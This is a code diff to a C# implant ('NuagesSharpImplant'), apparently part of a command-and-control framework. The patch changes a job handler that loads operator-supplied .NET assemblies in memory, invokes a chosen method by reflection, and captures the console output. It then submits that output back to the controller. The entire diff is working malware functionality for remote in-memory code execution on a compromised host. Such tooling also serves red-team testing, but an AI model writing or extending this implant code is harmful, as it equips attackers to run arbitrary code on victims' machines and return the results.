@@ -336,23 +336,35 @@ namespace NuagesSharpImplant
                     string file_id = job["payload"]["options"]["file_id"];
                     bool cache = job["payload"]["options"]["cache"];
                     Assembly assembly;
-                    string[] strarr = arguments.Split(',');
                     string result = "";
-                    Type[] typearr = new Type[strarr.Length];
-                    Object[] argarr = new Object[strarr.Length];
-                    for (int i = 0; i < strarr.Length; i++) {
-                        if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
+                    Object[] argarr;
+                    Type[] typearr;
+                    if (arguments == "")
+                    {
+                        typearr = new Type[0];
+                        argarr = new Object[0];
+                    }
+                    else
+                    {
+                        string[] strarr = arguments.Split(',');
+                        typearr = new Type[strarr.Length];
+                        argarr = new Object[strarr.Length];
+                        for (int i = 0; i < strarr.Length; i++)
                         {
-                            argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
+                            if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
+                            {
+                                argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
+                            }
+                            else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
+                            {
+                                argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
+                            }
+                            else
+                            {
+                                argarr[i] = strarr[i];
+                            }
+                            typearr[i] = argarr[i].GetType();
                         }
-                        else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
-                        {
-                            argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
-                        }
-                        else {
-                            argarr[i] = strarr[i];
-                        }
-                        typearr[i] = argarr[i].GetType();
                     }
                     if (this.assemblies.ContainsKey(file_id) && cache) {
                         assembly = this.assemblies[file_id];
@@ -361,7 +373,19 @@ namespace NuagesSharpImplant
                         assembly = Assembly.Load(buffer);
                         if (cache) { this.assemblies[file_id] = assembly; }
                     }
-                    result = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr).ToString();
+                    TextWriter oldOut = Console.Out;
+                    TextWriter oldOutErr = Console.Error;
+                    MemoryStream ostrm = new MemoryStream();
+                    StreamWriter writer = new StreamWriter(ostrm);
+                    Console.SetOut(writer);
+                    Console.SetError(writer);
+                    object objResult = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr);
+                    Console.SetOut(oldOut);
+                    Console.SetError(oldOutErr);
+                    writer.Close();
+                    ostrm.Close();
+                    result = Encoding.ASCII.GetString(ostrm.ToArray());
+                    try { result += "\r\n" + objResult.ToString(); } catch (Exception e) { }
                     SubmitJobResult(jobId, result, false);
                 }
                 else if (jobType == "interactive")
